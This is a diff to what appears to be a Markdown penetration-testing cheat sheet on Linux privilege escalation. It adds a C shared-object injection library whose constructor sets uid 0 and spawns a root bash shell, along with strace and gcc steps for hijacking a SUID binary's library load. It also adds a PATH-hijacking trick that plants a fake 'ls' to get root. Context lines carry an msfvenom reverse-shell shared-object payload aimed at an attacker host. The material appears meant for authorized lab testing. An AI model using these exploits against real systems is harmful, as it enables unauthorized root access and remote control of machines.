@@ -158,6 +158,7 @@ ssh <Restricted Username>@<Target> -t "/bin/sh"
 [Escape Restricted Shell](https://www.google.com/search?q=%22Restricted+shell%22+++%22pentesting%22&oq=%22Restricted+shell%22+++%22pentesting%22)
 
 # Shared Object Libraries
+### Using msfvenom
 ##### Determine Libraries Loaded by Binary
 ```bash
 ldd <Binary Name>
@@ -174,6 +175,31 @@ objdump -x <Binary Name> | grep RUNPATH
 ```bash
 msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=<Attacker IP> LPORT=<Attacker Port> -f elf-so -o <Library Name>
 # Transfer to the path indicated in RPATH or RUNPATH.
+```
+
+### Generated C Code
+##### SUID / SGID Executables - Shared Object Injection
+```c
+/* File libcalc.c */
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+        setuid(0);
+        system("/bin/bash -p");
+}
+```
+[libcalc.c](Files/libcalc.c)
+```bash
+# First, execute the file and note that currently it displays a progress bar before exiting:
+/usr/local/bin/suid-so
+# Run strace on the file and search the output for open/access calls and for "no such file" errors:
+strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+# strace shows suid-so is trying to load /home/user/.config/libcalc.so.
+gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
+/usr/local/bin/suid-so
 ```
 
 ### Shared Object Libraries References
@@ -269,6 +295,16 @@ cat /docker/output.txt
 [Docker](https://docs.docker.com/engine/install/linux-postinstall/)
 
 [Docker Tips: about /var/run/docker.sock](https://betterprogramming.pub/about-var-run-docker-sock-3bfd276e12fd)
+
+# Script Executing as root
+```bash
+cd /tmp
+echo "/bin/bash" > ls
+chmod +x ls
+export PATH=/tmp:$PATH
+cd ~
+./script
+```
 
 # References
 [0xsp Cheatsheet](https://0xsp.com/offensive/privilege-escalation-cheatsheet/)
